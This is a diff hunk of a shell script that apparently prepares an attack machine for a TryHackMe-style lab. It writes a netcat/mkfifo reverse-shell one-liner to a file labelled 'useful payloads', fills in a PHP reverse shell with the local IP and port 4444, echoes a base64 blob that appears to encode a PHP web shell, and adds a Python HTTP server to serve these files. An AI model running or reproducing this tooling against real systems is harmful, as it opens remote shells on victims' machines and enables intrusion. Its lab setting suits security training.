@@ -36,3 +36,8 @@ echo PGZvcm0gbWV0aG9kPSJHRVQiIG5hbWU9Ijw/cGhwIGVjaG8gYmFzZW5hbWUoJF9TRVJWRVJbJ1B
 echo "useful payloads"
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(hostname -i) 4444 >/tmp/f" > nc-rev.txt
 cp /usr/share/webshells/php/php-reverse-shell.php ./reverse.php && sed -i "s/PUT_THM_ATTACKBOX_IP_HERE/$(hostname -i)/g" reverse.php && sed -i "s/1234/4444/g" reverse.php
+
+echo "starting webserver"
+python3 -m http.server 1234 &
+
+echo "ready!"
